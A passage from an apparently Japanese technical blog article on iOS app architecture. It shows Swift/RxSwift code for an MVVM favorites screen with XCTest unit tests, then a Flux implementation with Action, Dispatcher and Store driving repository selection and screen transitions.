        <span class="kc">self</span><span class="p">.</span><span class="n">relaodData</span> <span class="p">=</span> <span class="n">_favorites</span><span class="p">.</span><span class="n">asObservable</span><span class="p">().</span><span class="bp">map</span> <span class="p">{</span> <span class="kc">_</span> <span class="k">in</span> <span class="p">}</span>
        <span class="p">...</span>
        <span class="n">favoritesObservable</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">_favorites</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewModel</code>で公開されているreloadDataを<code>FavoriteViewController</code>の<code>reloadData: AnyObserver&lt;Void&gt;</code>にbindすると<code>tableView.reloadData()</code>が実行されるので、<code>FavoriteViewController</code>上でリストが更新されます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">private</span><span class="p">(</span><span class="kr">set</span><span class="p">)</span> <span class="kr">lazy</span> <span class="kd">var</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span> <span class="p">=</span> <span class="p">{</span>
        <span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">favoritesObservable</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">favorites</span><span class="p">,</span> <span class="p">...)</span>
    <span class="p">}()</span>

    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favorites</span> <span class="p">=</span> <span class="n">PublishSubject</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;</span><span class="p">()</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="c1">// observe viewModel</span>
        <span class="n">viewModel</span><span class="p">.</span><span class="n">relaodData</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">reloadData</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">reloadData</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">UIBindingObserver</span><span class="p">(</span><span class="n">UIElement</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span> <span class="p">{</span> <span class="n">me</span><span class="p">,</span> <span class="kc">_</span> <span class="k">in</span>
            <span class="n">me</span><span class="p">.</span><span class="n">tableView</span><span class="p">.</span><span class="n">reloadData</span><span class="p">()</span>
        <span class="p">}.</span><span class="n">asObserver</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>お気に入りに追加/削除される流れは下記のようになります。</p>

<p><code>FavoriteViewController</code>の<code>favoriteInput: Obsservable&lt;[GithubKit.Repository]&gt;</code>と<code>favoriteOutput: Observable&lt;[GithubKit.Repository]&gt;</code>は画面遷移時に、他のViewControllerのinitializerの引数として渡されていきます。<br>
<code>RepositoryViewController</code>ではfavoriteOutputから受け取った配列をもとに、保持している<code>GithubKit.Repository</code>が含まれているかを確認し、追加または削除を行った配列をfavoriteOutputに対して流します。<br>
favoriteInputは<code>FavoriteViewModel</code>内で保持されている<code>_favorites: Variable&lt;[GithubKit.Repository]&gt;</code>にbindし、その更新イベントをfavoriteOutputによって外部に公開されます。<br>
また、_favoritesの更新イベントを<code>Observable&lt;Void&gt;</code>に変換し<code>reloadData</code>として公開することで、<code>FavoriteViewController</code>側でreloadData: AnyObserver<code>にbindされ、</code>tableView.reloadData()<code>が実行されるので</code>FavoriteViewController`上でリストが更新されます。</p>

<p><a href="https://camo.qiitausercontent.com/e1151c4a8f64c2b32877f1824c953b7205b1bcb3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f39663362343962352d366466312d323034362d346138642d6662656231323137303839632e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/e1151c4a8f64c2b32877f1824c953b7205b1bcb3/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f39663362343962352d366466312d323034362d346138642d6662656231323137303839632e6a706567" alt="MVVM.003.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/9f3b49b5-6df1-2046-4a8d-fbeb1217089c.jpeg"></a></p>

<h3>
<span id="テスト-1" class="fragment"></span><a href="#%E3%83%86%E3%82%B9%E3%83%88-1"><i class="fa fa-link"></i></a>テスト</h3>

<p><code>FavoriteViewModel</code>はinitializerの引数として、<code>favoritesObservable: Observable&lt;[GithubKit.Repository]&gt;</code>と<code>selectedIndexPath: Observable&lt;IndexPath&gt;</code>を受け取っています。<br>
XCTestなどでテストを行う際に、それらを外部から注入してイベントを送ることで、ViewModelのプレゼンテーション層に関するロジックのテストが可能になります。<br>
テストメソッド内では該当するsubscribeのclosureに対して期待する結果を記述し、その後に紐づくPublishSubjectからイベントを送っています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewModelTests</span></div>
<div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FavoriteViewModelTests</span><span class="p">:</span> <span class="n">XCTestCase</span> <span class="p">{</span>

    <span class="kd">var</span> <span class="nv">viewModel</span><span class="p">:</span> <span class="n">FavoriteViewModel</span><span class="p">!</span>
    <span class="kd">var</span> <span class="nv">favorites</span><span class="p">:</span> <span class="n">PublishSubject</span><span class="o">&lt;</span><span class="p">[</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">]</span><span class="o">&gt;!</span>
    <span class="kd">var</span> <span class="nv">selectedIndexPath</span><span class="p">:</span> <span class="n">PublishSubject</span><span class="p">&lt;</span><span class="n">IndexPath</span><span class="p">&gt;</span><span class="o">!</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">setUp</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">setUp</span><span class="p">()</span>

        <span class="kc">self</span><span class="p">.</span><span class="n">viewModel</span> <span class="p">=</span> <span class="n">FavoriteViewModel</span><span class="p">(</span><span class="n">favoritesObservable</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">favorites</span><span class="p">,</span>
                                           <span class="n">selectedIndexPath</span><span class="p">:</span> <span class="kc">self</span><span class="p">.</span><span class="n">selectedIndexPath</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testRelaodData</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testReloadData expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">disposable</span> <span class="p">=</span> <span class="n">viewModel</span><span class="p">.</span><span class="n">relaodData</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span>
                <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
            <span class="p">})</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="n">favorites</span><span class="p">.</span><span class="n">onNext</span><span class="p">([</span><span class="n">repository</span><span class="p">])</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="n">disposable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
    <span class="p">}</span>

    <span class="kd">func</span> <span class="nf">testSelectedRepository</span><span class="p">()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">expectation</span> <span class="p">=</span> <span class="kc">self</span><span class="p">.</span><span class="n">expectation</span><span class="p">(</span><span class="n">description</span><span class="p">:</span> <span class="s">"testSelectedRepository expectation"</span><span class="p">)</span>

        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">Repository</span><span class="p">.</span><span class="n">mock</span><span class="p">()</span>
        <span class="kd">let</span> <span class="nv">disposable</span> <span class="p">=</span> <span class="n">viewModel</span><span class="p">.</span><span class="n">selectedRepository</span>
            <span class="p">.</span><span class="n">subscribe</span><span class="p">(</span><span class="n">onNext</span><span class="p">:</span> <span class="p">{</span> <span class="n">repo</span> <span class="k">in</span>
                <span class="n">XCTAssertEqual</span><span class="p">(</span><span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">repo</span><span class="p">.</span><span class="n">url</span><span class="p">)</span>
                <span class="n">expectation</span><span class="p">.</span><span class="n">fulfill</span><span class="p">()</span>
            <span class="p">})</span>

        <span class="n">favorites</span><span class="p">.</span><span class="n">onNext</span><span class="p">([</span><span class="n">repository</span><span class="p">])</span>

        <span class="n">waitForExpectations</span><span class="p">(</span><span class="n">timeout</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span> <span class="n">handler</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
        <span class="n">disposable</span><span class="p">.</span><span class="n">dispose</span><span class="p">()</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<h3>
<span id="考察-1" class="fragment"></span><a href="#%E8%80%83%E5%AF%9F-1"><i class="fa fa-link"></i></a>考察</h3>

<p>ViewとViewModelはData bindingによってやり取りが行われるため、ViewはViewModelの参照を持ちますがViewModelは直接的にViewに依存はしません。<br>
また、ViewModelのinputに対して擬似的にユーザーのアクションをイベントとして送り、ViewModelのoutputのイベントを確認することでプレゼンテーション層に関するロジックのテストが可能です。<br>
そういった利点がある一方で、標準フレームワークだけでData bindingを実現することは容易ではありません。<br>
NotificationCenterやKVOを利用することで近しいものは実装できますが、取得できる値の型がAnyになってしまうという問題があります。<br>
また、propertyのdidSetでdelegateのメソッドを呼ぶことで近しい実装もできますが、delegateのオブジェクトは基本的に1つなので複数にしたい場合はforwardInvocationを利用する必要があったりしてしまいます。</p>

<h2>
<span id="flux" class="fragment"></span><a href="#flux"><i class="fa fa-link"></i></a>Flux</h2>

<p>最後に、Fluxによる実装について書いていきます。</p>

<p><a href="https://camo.qiitausercontent.com/66bcf84aea21aa00d294c3e20b5192753b26a2ec/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38303265616335642d386563372d353937642d656539322d6537333730643037343233392e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/66bcf84aea21aa00d294c3e20b5192753b26a2ec/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f38303265616335642d386563372d353937642d656539322d6537333730643037343233392e6a706567" width="50%" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/802eac5d-8ec7-597d-ee92-e7370d074239.jpeg"></a></p>

<p>Fluxのパーツとして</p>

<ul>
<li>
<strong>Action</strong>...Viewからイベントを処理し、Dispatcherに値を流します。</li>
<li>
<strong>Dispatcher</strong>...Actionから受け取った値を、Storeに流します。</li>
<li>
<strong>Store</strong>...Dispatcherから受け取った値を保持し、値の変更を通知します。</li>
<li>
<strong>View</strong>...ユーザーかの操作によってActionを実行し、Storeの変更を反映します。</li>
</ul>

<p>があります。<br>
それらは、<strong>View → Action → Dispather → Store → View</strong>という形で単一方向のデータフローになっています。<br>
ActionはどのViewからでも実行ができ、StoreはどのViewから参照されたとしても値を取得することができます。</p>

<p>このサンプルの場合、Fluxのパーツの構成は</p>

<ul>
<li>1つのDispatcher</li>
<li>ActionとStoreが一対一の組み合わせが複数</li>
</ul>

<p>となっています。</p>

<p>また、ViewControllerごとにActionやStoreがあるわけではなく</p>

<ul>
<li><code>GithubのRepositoryに関するActionとStore</code></li>
<li><code>GithubのUserに関するActionとStore</code></li>
</ul>

<p>という作りになっています。</p>

<p>※Action、Dispatcher、Storeの実装を簡易化するために、<a href="https://github.com/marty-suzuki/FluxCapacitor" rel="nofollow noopener" target="_blank">FluxCapacitor</a>を利用しています。</p>

<h3>
<span id="画面遷移-2" class="fragment"></span><a href="#%E7%94%BB%E9%9D%A2%E9%81%B7%E7%A7%BB-2"><i class="fa fa-link"></i></a>画面遷移</h3>

<p><code>UITableViewDataSource</code>や<code>UITableViewDelegate</code>の実装を、<code>FavoriteViewController</code>の場合は<code>FavoriteViewDataSource</code>に移しています。<br>
<code>FavoriteViewDataSource</code>内の<code>tableView(_:didSelectRowAt:)</code>では、<code>RepositoryStore</code>から該当の<code>GithubKit.Repository</code>を取得し、<code>RepositoryAction</code>の<code>selectRepository(_:)</code>に渡されています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewDataSource</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewDataSource</span><span class="p">:</span> <span class="bp">NSObject</span><span class="p">,</span> <span class="bp">UITableViewDelegate</span><span class="p">,</span> <span class="p">...</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">action</span><span class="p">:</span> <span class="n">RepositoryAction</span>

    <span class="kd">init</span><span class="p">(</span><span class="n">store</span><span class="p">:</span> <span class="n">RepositoryStore</span> <span class="p">=</span> <span class="p">.</span><span class="n">instantiate</span><span class="p">(),</span>
         <span class="n">action</span><span class="p">:</span> <span class="n">RepositoryAction</span> <span class="p">=</span> <span class="p">.</span><span class="kd">init</span><span class="p">())</span> <span class="p">{</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">store</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">action</span> <span class="p">=</span> <span class="n">action</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">tableView</span><span class="p">(</span><span class="kc">_</span> <span class="n">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">,</span> <span class="n">didSelectRowAt</span> <span class="n">indexPath</span><span class="p">:</span> <span class="n">IndexPath</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">favoritesValue</span><span class="p">[</span><span class="n">indexPath</span><span class="p">.</span><span class="n">row</span><span class="p">]</span>
        <span class="n">action</span><span class="p">.</span><span class="n">selectRepository</span><span class="p">(</span><span class="n">repository</span><span class="p">)</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>RepositoryAction</code>は受け取った<code>GithubKit.Repository</code>を<code>Dispatcher</code>に渡し、<code>RepositoryStore</code>は<code>Dispatcher</code>から<code>GithubKit.Repository</code>を受け取ります。<br>
受け取った<code>GithubKit.Repository</code>は<code>_selectedRepository: Variable&lt;GithubKit.Repository?&gt;</code>に保持されます。<br>
<code>selectedRepository: Observable&lt;GithubKit.Repository?&gt;</code>が外部に公開されているので、値が更新された際にイベントが流れます。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryFluxFlow</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryAction</span><span class="p">:</span> <span class="n">Actionable</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">DispatchValueType</span> <span class="p">=</span> <span class="n">Dispatcher</span><span class="p">.</span><span class="n">Repository</span>
    <span class="p">...</span>
    <span class="kd">func</span> <span class="nf">selectRepository</span><span class="p">(</span><span class="kc">_</span> <span class="n">repository</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">invoke</span><span class="p">(.</span><span class="n">selectedRepository</span><span class="p">(</span><span class="n">repository</span><span class="p">))</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>

<span class="kd">extension</span> <span class="nc">Dispatcher</span> <span class="p">{</span>
    <span class="kd">enum</span> <span class="nc">Repository</span><span class="p">:</span> <span class="n">DispatchValue</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">case</span> <span class="n">selectedRepository</span><span class="p">(</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">?)</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryStore</span><span class="p">:</span> <span class="n">Storable</span> <span class="p">{</span>
    <span class="kd">typealias</span> <span class="n">DispatchValueType</span> <span class="p">=</span> <span class="n">Dispatcher</span><span class="p">.</span><span class="n">Repository</span>
    <span class="p">...</span>
    <span class="kd">let</span> <span class="nv">selectedRepository</span><span class="p">:</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">?</span><span class="o">&gt;</span>
    <span class="kd">var</span> <span class="nv">selectedRepositoryValue</span><span class="p">:</span> <span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">?</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">_selectedRepository</span><span class="p">.</span><span class="n">value</span>
    <span class="p">}</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">_selectedRepository</span> <span class="p">=</span> <span class="n">Variable</span><span class="p">&lt;</span><span class="n">GithubKit</span><span class="p">.</span><span class="n">Repository</span><span class="p">?</span><span class="o">&gt;</span><span class="p">(</span><span class="kc">nil</span><span class="p">)</span>
    <span class="p">...</span>
    <span class="kd">init</span><span class="p">(</span><span class="n">dispatcher</span><span class="p">:</span> <span class="n">Dispatcher</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">selectedRepository</span> <span class="p">=</span> <span class="n">_selectedRepository</span><span class="p">.</span><span class="n">asObservable</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="n">register</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="k">in</span>
            <span class="k">switch</span> <span class="nv">$0</span> <span class="p">{</span>
            <span class="p">...</span>
            <span class="k">case</span> <span class="p">.</span><span class="n">selectedRepository</span><span class="p">(</span><span class="kd">let</span> <span class="nv">value</span><span class="p">):</span>
                <span class="kc">self</span><span class="p">?.</span><span class="n">_selectedRepository</span><span class="p">.</span><span class="n">value</span> <span class="p">=</span> <span class="n">value</span>
            <span class="p">...</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>FavoriteViewController</code>では、<code>RepositoryStore</code>の<code>selectedRepository: Observable&lt;GithubKit.Repository?&gt;</code>から流れてきたイベントを受け取り、そのイベントの値をVoidに変換して、<code>showRepository: AnyObserver&lt;Void&gt;</code>にbindします。<br>
ViewControllerの遷移時、他のデザインパターンと異なる部分になるのですが、<code>RepositoryViewController</code>のinitializerは引数として<code>GithubKit.Repository</code>を渡していません。</p>

<p>※store.selectedRepositoryはviewDidAppear時にsubscribeされ、viewDidDisappear時にdisposeされる実装がされています。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">FavoriteViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">FavoriteViewController</span><span class="p">:</span> <span class="bp">UIViewController</span> <span class="p">{</span>
    <span class="kr">@IBOutlet</span> <span class="kr">weak</span> <span class="kd">var</span> <span class="nv">tableView</span><span class="p">:</span> <span class="bp">UITableView</span><span class="p">!</span>

    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">dataSource</span> <span class="p">=</span> <span class="n">FavoriteViewDataSource</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span> <span class="p">=</span> <span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">()</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="c1">// observe store</span>
        <span class="n">rx</span><span class="p">.</span><span class="n">methodInvoked</span><span class="p">(</span><span class="k">#selector</span><span class="p">(</span><span class="n">FavoriteViewController</span><span class="p">.</span><span class="n">viewDidAppear</span><span class="p">(</span><span class="kc">_</span><span class="p">:)))</span>
            <span class="p">.</span><span class="n">flatMapLatest</span> <span class="p">{</span> <span class="p">[</span><span class="kr">weak</span> <span class="kc">self</span><span class="p">]</span> <span class="kc">_</span> <span class="p">-&gt;</span> <span class="n">Observable</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span> <span class="k">in</span>
                <span class="k">guard</span> <span class="kd">let</span> <span class="nv">me</span> <span class="p">=</span> <span class="kc">self</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="p">.</span><span class="n">empty</span><span class="p">()</span> <span class="p">}</span>
                <span class="kd">let</span> <span class="nv">viewWillDisappear</span> <span class="p">=</span> <span class="n">me</span><span class="p">.</span><span class="n">rx</span>
                    <span class="p">.</span><span class="n">sentMessage</span><span class="p">(</span><span class="k">#selector</span><span class="p">(</span><span class="n">FavoriteViewController</span><span class="p">.</span><span class="n">viewDidDisappear</span><span class="p">(</span><span class="kc">_</span><span class="p">:)))</span>
                <span class="k">return</span> <span class="n">me</span><span class="p">.</span><span class="n">store</span><span class="p">.</span><span class="n">selectedRepository</span>
                    <span class="p">.</span><span class="n">takeUntil</span><span class="p">(</span><span class="n">viewWillDisappear</span><span class="p">)</span>
                    <span class="p">.</span><span class="bp">filter</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">}</span>
                    <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="kc">_</span> <span class="k">in</span> <span class="p">}</span>
            <span class="p">}</span>
            <span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">to</span><span class="p">:</span> <span class="n">showRepository</span><span class="p">)</span>
            <span class="p">.</span><span class="n">disposed</span><span class="p">(</span><span class="n">by</span><span class="p">:</span> <span class="n">disposeBag</span><span class="p">)</span>
        <span class="p">...</span>
    <span class="p">}</span>

    <span class="kd">private</span> <span class="kd">var</span> <span class="nv">showRepository</span><span class="p">:</span> <span class="n">AnyObserver</span><span class="p">&lt;</span><span class="nb">Void</span><span class="p">&gt;</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">UIBindingObserver</span><span class="p">(</span><span class="n">UIElement</span><span class="p">:</span> <span class="kc">self</span><span class="p">)</span> <span class="p">{</span> <span class="n">me</span><span class="p">,</span> <span class="kc">_</span> <span class="k">in</span>
            <span class="k">guard</span> <span class="kd">let</span> <span class="nv">vc</span> <span class="p">=</span> <span class="n">RepositoryViewController</span><span class="p">()</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="p">}</span>
            <span class="n">me</span><span class="p">.</span><span class="n">navigationController</span><span class="p">?.</span><span class="n">pushViewController</span><span class="p">(</span><span class="n">vc</span><span class="p">,</span> <span class="n">animated</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
        <span class="p">}.</span><span class="n">asObserver</span><span class="p">()</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</pre></div>
</div>

<p><code>GithubKit.Repository</code>を引数として渡す必要がない理由として、<code>FavoriteViewDataSource</code>内の<code>tableView(_:didSelectRowAt:)</code>で<code>RepositoryStore</code>の<code>_selectedRepository: Variable&lt;GithubKit.Repository?&gt;</code>に保持されています。<br>
そのため、<code>store.selectedRepositoryValue</code>として値を取り出すことで、該当の<code>GithubKit.Repository</code>を受け取ることができます。<br>
ViewController内で実際に利用する場合、<code>store.selectedRepository</code>を<code>Observable&lt;GithubKit.Repository&gt;</code>に変換して利用します。</p>

<div class="code-frame" data-lang="swift">
<div class="code-lang"><span class="bold">RepositoryViewController</span></div>
<div class="highlight"><pre><span></span><span class="kr">final</span> <span class="kd">class</span> <span class="nc">RepositoryViewController</span><span class="p">:</span> <span class="n">SFSafariViewController</span> <span class="p">{</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">favoriteButtonItem</span> <span class="p">=</span> <span class="bp">UIBarButtonItem</span><span class="p">(</span><span class="n">title</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">style</span><span class="p">:</span> <span class="p">.</span><span class="n">plain</span><span class="p">,</span> <span class="n">target</span><span class="p">:</span> <span class="kc">nil</span><span class="p">,</span> <span class="n">action</span><span class="p">:</span> <span class="kc">nil</span><span class="p">)</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">disposeBag</span> <span class="p">=</span> <span class="n">DisposeBag</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">action</span> <span class="p">=</span> <span class="n">RepositoryAction</span><span class="p">()</span>
    <span class="kd">private</span> <span class="kd">let</span> <span class="nv">store</span><span class="p">:</span> <span class="n">RepositoryStore</span>

    <span class="kd">init</span><span class="p">?()</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nv">store</span> <span class="p">=</span> <span class="n">RepositoryStore</span><span class="p">.</span><span class="n">instantiate</span><span class="p">()</span>
        <span class="k">guard</span> <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">selectedRepositoryValue</span> <span class="k">else</span> <span class="p">{</span> <span class="k">return</span> <span class="kc">nil</span> <span class="p">}</span>
        <span class="kc">self</span><span class="p">.</span><span class="n">store</span> <span class="p">=</span> <span class="n">store</span>
        <span class="kc">super</span><span class="p">.</span><span class="kd">init</span><span class="p">(</span><span class="n">url</span><span class="p">:</span> <span class="n">repository</span><span class="p">.</span><span class="n">url</span><span class="p">,</span> <span class="n">entersReaderIfAvailable</span><span class="p">:</span> <span class="kc">true</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="kr">override</span> <span class="kd">func</span> <span class="nf">viewDidLoad</span><span class="p">()</span> <span class="p">{</span>
        <span class="kc">super</span><span class="p">.</span><span class="n">viewDidLoad</span><span class="p">()</span>
        <span class="p">...</span>
        <span class="c1">// observe store</span>
        <span class="kd">let</span> <span class="nv">repository</span> <span class="p">=</span> <span class="n">store</span><span class="p">.</span><span class="n">selectedRepository</span>
            <span class="p">.</span><span class="bp">filter</span> <span class="p">{</span> <span class="nv">$0</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">}</span>
            <span class="p">.</span><span class="bp">map</span> <span class="p">{</span> <span class="nv">$0</span><span class="p">!</span> <span class="p">}</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>

<p>上記のTableViewのCellが選択されてから、次のViewControllerに遷移するまでの流れは下図のようになります。</p>

<p><a href="https://camo.qiitausercontent.com/39c2e0e012b1047ee48940014e73d0c4200563ca/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f37343863383833622d633732312d396439632d646363342d3565653065613964623632612e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/39c2e0e012b1047ee48940014e73d0c4200563ca/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f36303332352f37343863383833622d633732312d396439632d646363342d3565653065613964623632612e6a706567" alt="Flux.002.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/60325/748c883b-c721-9d9c-dcc4-5ee0ea9db62a.jpeg"></a></p>

<h3>
<span id="お気に入りに追加-2" class="fragment"></span><a href="#%E3%81%8A%E6%B0%97%E3%81%AB%E5%85%A5%E3%82%8A%E3%81%AB%E8%BF%BD%E5%8A%A0-2"><i class="fa fa-link"></i></a>お気に入りに追加</h3>

<p><code>store.selectedRepository</code>を<code>Observable&lt;GithubKit.Repository&gt;</code>に変換した<code>noNilRepository</code>を利用します。<br>
